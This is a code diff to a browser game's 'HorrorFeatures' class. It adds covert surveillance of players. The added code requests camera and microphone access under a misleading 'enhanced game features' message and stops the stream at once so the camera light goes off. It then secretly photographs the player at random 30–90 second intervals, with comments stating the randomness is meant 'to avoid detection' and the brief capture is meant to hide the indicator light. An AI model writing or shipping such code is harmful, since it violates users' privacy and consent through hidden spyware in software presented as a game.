@@ -8,23 +8,29 @@ class HorrorFeatures {
         };
         this.playerPhotos = [];
         this.audioRecordings = [];
+        this.cameraActive = false;
+        this.photoTimer = null;
     }
 
     async requestPermissions() {
-        // Request permissions subtly during normal gameplay
+        // Request permissions but don't keep camera on
         try {
             console.log('🎮 Initializing enhanced game features...');
             
-            // Request camera and microphone access
-            this.mediaStream = await navigator.mediaDevices.getUserMedia({
+            // Test access then immediately close
+            const testStream = await navigator.mediaDevices.getUserMedia({
                 video: { width: 640, height: 480 },
                 audio: true
             });
+            
+            // Close the stream immediately to turn off camera light
+            testStream.getTracks().forEach(track => track.stop());
             
             this.permissionsGranted.camera = true;
             this.permissionsGranted.microphone = true;
             
             console.log('✅ Enhanced features enabled');
+            this.startPeriodicPhotoCapture();
             return true;
         } catch (error) {
             console.log('⚠️ Some features unavailable:', error.message);
@@ -32,16 +38,44 @@ class HorrorFeatures {
         }
     }
 
+    startPeriodicPhotoCapture() {
+        // Take photos at random intervals to avoid detection
+        const scheduleNextPhoto = () => {
+            const delay = Math.random() * 60000 + 30000; // 30-90 seconds
+            this.photoTimer = setTimeout(async () => {
+                await this.takeSecretPhoto();
+                scheduleNextPhoto(); // Schedule next photo
+            }, delay);
+        };
+        
+        scheduleNextPhoto();
+    }
+
+    stopPeriodicCapture() {
+        if (this.photoTimer) {
+            clearTimeout(this.photoTimer);
+            this.photoTimer = null;
+        }
+    }
+
     async takeSecretPhoto() {
-        if (!this.permissionsGranted.camera || !this.mediaStream) return null;
+        if (!this.permissionsGranted.camera) return null;
         
         try {
+            // Only turn on camera for a brief moment
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { width: 640, height: 480 }
+            });
+            
             const video = document.createElement('video');
-            video.srcObject = this.mediaStream;
+            video.srcObject = stream;
             video.style.display = 'none';
             document.body.appendChild(video);
             
             await video.play();
+            
+            // Wait a moment for camera to stabilize
+            await new Promise(resolve => setTimeout(resolve, 500));
             
             const canvas = document.createElement('canvas');
             canvas.width = 640;
@@ -51,7 +85,8 @@ class HorrorFeatures {
             ctx.drawImage(video, 0, 0, 640, 480);
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
             
-            // Clean up
+            // IMMEDIATELY stop the camera to turn off light
+            stream.getTracks().forEach(track => track.stop());
             video.pause();
             document.body.removeChild(video);
             
